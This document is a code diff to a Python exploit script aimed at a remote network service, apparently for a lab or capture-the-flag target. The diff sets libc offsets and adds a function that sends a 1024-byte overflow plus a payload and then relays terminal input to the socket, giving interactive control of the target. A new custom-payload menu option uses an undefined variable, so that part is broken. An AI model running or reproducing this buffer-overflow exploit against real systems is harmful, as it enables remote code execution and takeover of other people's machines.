@@ -1,5 +1,7 @@
 #!/usr/bin/python3
+import select
 
+import sys
 import socket as S
 from binascii import hexlify, unhexlify
 from struct import pack, unpack
@@ -71,7 +73,7 @@ USERNAME_OFFSET = 0x4040
 # KNOWN LIBC OFFSETS
 # ============================================================
 
-LIBC_WRITE = 0x001139b0
+LIBC_WRITE =  0x00113a70
 LIBC_SYSTEM = 0x0004f8e0
 
 
@@ -92,12 +94,6 @@ def u32(value):
 # ============================================================
 
 def oracle(username=b"toto", data=b"", timeout=0.5):
-    """
-    Send a normal payload.
-
-    Returns True when the server behaves as expected.
-    """
-
     try:
         s = S.socket(S.AF_INET, S.SOCK_STREAM)
 
@@ -106,18 +102,10 @@ def oracle(username=b"toto", data=b"", timeout=0.5):
 
         s.connect((HOST, PORT))
 
-        # ----------------------------------------------------
-        # Hello
-        # ----------------------------------------------------
-
         s.send(pack("<H", 0))
         s.send(username)
 
-        s.recv(100)
-
-        # ----------------------------------------------------
-        # Ping-pong
-        # ----------------------------------------------------
+        hello = s.recv(100)
 
         s.send(pack("<H", 1))
 
@@ -129,27 +117,34 @@ def oracle(username=b"toto", data=b"", timeout=0.5):
         rep = s.recv(len(buf))
 
         if rep != buf:
+            print("[!] Bad pong reply")
+            print(f"    expected: {len(buf)} bytes")
+            print(f"    received: {len(rep)} bytes")
+            s.close()
             return False
-
-        # ----------------------------------------------------
-        # Bye
-        # ----------------------------------------------------
 
         s.send(pack("<H", 2))
 
         bye = s.recv(100)
 
-        if bye != b"Bye " + username:
+        expected_bye = b"Bye " + username
+
+        if bye != expected_bye:
+            print("[!] Bad bye reply")
+            print("    expected:", repr(expected_bye))
+            print("    received:", repr(bye))
+            s.close()
             return False
 
         s.close()
-
         return True
 
-    except Exception:
+    except Exception as e:
+        print(
+            f"[!] oracle exception: "
+            f"{type(e).__name__}: {e}"
+        )
         return False
-
-
 def leak_oracle(username=b"toto", data=b"", timeout=0.5):
     """
     Send a payload and return the server response.
@@ -188,6 +183,95 @@ def leak_oracle(username=b"toto", data=b"", timeout=0.5):
         return b""
 
 
+def send_final_payload(username, payload, timeout=2.0):
+    """
+    Send the final payload and keep the socket alive for
+    interactive communication.
+    """
+
+    s = S.socket(S.AF_INET, S.SOCK_STREAM)
+    s.settimeout(timeout)
+
+    try:
+        s.connect((HOST, PORT))
+
+        # ----------------------------------------------------
+        # Initial protocol
+        # ----------------------------------------------------
+
+        s.sendall(pack("<H", 0))
+        s.sendall(username)
+
+        hello = s.recv(100)
+
+        # ----------------------------------------------------
+        # Send final overflow
+        # ----------------------------------------------------
+
+        s.sendall(pack("<H", 1))
+
+        buf = b"A" * 1024 + payload
+
+        s.sendall(pack("<H", len(buf)))
+        s.sendall(buf)
+
+        print("\n[+] Final payload sent.")
+        print("[+] Interactive connection starting...\n")
+
+        s.setblocking(False)
+
+        while True:
+
+            readable, _, _ = select.select(
+                [s, sys.stdin],
+                [],
+                [],
+            )
+
+            # ------------------------------------------------
+            # Target -> terminal
+            # ------------------------------------------------
+
+            if s in readable:
+
+                data = s.recv(4096)
+
+                if not data:
+                    print(
+                        "\n[*] Target closed connection."
+                    )
+                    break
+
+                sys.stdout.buffer.write(data)
+                sys.stdout.buffer.flush()
+
+            # ------------------------------------------------
+            # Terminal -> target
+            # ------------------------------------------------
+
+            if sys.stdin in readable:
+
+                command = sys.stdin.buffer.readline()
+
+                if not command:
+                    break
+
+                s.sendall(command)
+
+    except KeyboardInterrupt:
+
+        print("\n[*] Interrupted.")
+
+    except Exception as e:
+
+        print(
+            f"\n[!] Connection error: "
+            f"{type(e).__name__}: {e}"
+        )
+
+    finally:
+
+        s.close()
 # ============================================================
 # STACK LEAK
 # ============================================================
@@ -955,7 +1039,7 @@ def shellcode_flow(state):
     )
 
     answer = input(
-        "\nSend payload now? [y/N]: "
+        "\nSend final exploit now? [y/N]: "
     ).strip().lower()
 
     if answer not in ("y", "yes"):
@@ -966,21 +1050,16 @@ def shellcode_flow(state):
 
         return state, payload
 
+
     username = state["shellcode"]
 
     print(
-        "\n[+] Sending payload with loaded "
-        "shellcode data..."
+        "\n[+] Sending final exploit..."
     )
 
-    result = oracle(
+    send_final_payload(
         username=username,
-        data=payload,
-    )
-
-    print(
-        "Result:",
-        result,
+        payload=payload,
     )
 
     return state, payload
@@ -1461,6 +1540,26 @@ def main():
             print_state(
                 state
             )
+        # ----------------------------------------------------
+        # Send Custom Payload
+        # ----------------------------------------------------
+
+        elif choice == "7":
+
+            print(
+                "\n[+] Sending Custom Payload..."
+            )
+
+            
+
+            
+
+            print(
+                 oracle(
+                    data=raw_payload,
+                )
+            )
+        
 
         # ----------------------------------------------------
         # QUIT
